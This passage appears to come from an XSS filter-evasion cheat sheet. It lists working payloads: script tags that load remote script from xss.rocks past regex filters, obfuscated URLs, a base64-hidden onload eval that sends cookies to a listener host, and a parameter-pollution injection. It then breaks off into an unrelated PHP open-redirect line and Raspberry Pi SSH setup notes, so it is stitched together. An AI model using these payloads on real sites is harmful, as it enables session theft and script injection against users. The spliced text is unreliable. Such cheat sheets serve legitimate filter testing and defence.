I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags): < SCRIPT \" a = '>' \" SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > And one last XSS attack to evade, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i using grave accents (again, doesn't work in Firefox): < SCRIPT a = ` > ` SRC=\"httx://xss.rocks/xss.js\"> </ SCRIPT > Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly: < SCRIPT a = \">'>\" SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content: < SCRIPT > document . write ( \"<SCRI\" );</ SCRIPT > PT SRC=\"httx://xss.rocks/xss.js\"> </ SCRIPT > URL String Evasion \u00b6 Assuming http://www.google.com/ is programmatically disallowed: IP Versus Hostname \u00b6 < A HREF = \"http://66.102.7.147/\" > XSS </ A > URL Encoding \u00b6 < A HREF = \"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\" > XSS </ A > DWORD Encoding \u00b6 Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details: < A HREF = \"http://1113982867/\" > XSS </ A > Hex Encoding \u00b6 The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required): < A HREF = \"http://0x42.0x0000066.0x7.0x93/\" > XSS </ A > Octal Encoding \u00b6 Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...: < A HREF = \"http://0102.0146.0007.00000223/\" > XSS </ A > Base64 Encoding \u00b6 < img onload = \"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\" > Mixed Encoding \u00b6 Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes: < A HREF = \"h tt p://6 6.000146.0x7.147/\" > XSS </ A > Protocol Resolution Bypass \u00b6 // translates to http:// which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\\\\\ . You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL. < A HREF = \"//www.google.com/\" > XSS </ A > Google \"feeling lucky\" part 1 \u00b6 Firefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0. < A HREF = \"//google\" > XSS </ A > Google \"feeling lucky\" part 2 \u00b6 This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0: < A HREF = \"http://ha.ckers.org@google\" > XSS </ A > Google \"feeling lucky\" part 3 \u00b6 This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\"): < A HREF = \"http://google:ha.ckers.org\" > XSS </ A > Removing CNAMEs \u00b6 When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly): < A HREF = \"http://google.com/\" > XSS </ A > Extra dot for absolute DNS: < A HREF = \"http://www.google.com./\" > XSS </ A > JavaScript Link Location \u00b6 < A HREF = \"javascript:document.location='http://www.google.com/'\" > XSS </ A > Content Replace as Attack Vector \u00b6 Assuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\\#x09;script: was converted into java script: , which renders in IE, Netscape 8.1+ in secure site mode and Opera): < A HREF = \"http://www.google.com/ogle.com/\" > XSS </ A > Assisting XSS with HTTP Parameter Pollution \u00b6 Assume a content sharing flow on a web site is implemented as below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the \"Share\" page. Content Page Source Code \u00b6 `a href=\"/Share?content_type=1 & title= < %=Encode.forHtmlAttribute(untrusted content title)%>\">Share </ a > Share Page Source Code \u00b6 < script > var contentType = <%= Request . getParameter ( \"content_type\" ) %> ; var title = \"<%=Encode.forJavaScript(request.getParameter(\" title \"))%>\" ; ... //some user agreement and sending to server logic might be here ... </ script > Content Page Output \u00b6 In this case if attacker set untrusted content title as \u201cThis is a regular title&content_type=1;alert(1)\u201d the link in \"Content\" page would be this: < a href = \"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\" > Share </ a > Share Page Output \u00b6 And in share page output could be this: < script > var contentType = 1 ; alert ( 1 ); var title = \"This is a regular title\" ; \u2026 //some user agreement and sending to server logic might be here \u2026 </ script > As a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS. Character Escape Sequences \u00b6 All the possible combinations of the character \"\\<\" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above. < %3C &lt &lt; &LT &LT; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C Methods to Bypass WAF \u2013 Cross-Site Scripting \u00b6 Stored XSS \u00b6 If an attacker managed to push XSS through the filter, WAF wouldn\u2019t be able to prevent the attack conduction.

As well as: .. header('Refresh: 0; URL='.$_GET['param']); ...

Since we don't won't to use external screen or keyboard, we need to allow an SSH access to the Raspberry Pi OS on the first boot. After we created our bootable SD card we need to mount it and add a file called \u201cssh\u201d inside a boot partition. This will enable and start ssh daemon on pi at boot. To continue the setup we will need a Ethernet Cable with DHCP and Internet Connection. Insert the SD card and the Ethernet cable and boot your pi by connecting power.

You can do it inside your router's ui or use nmap tp find it on the network.
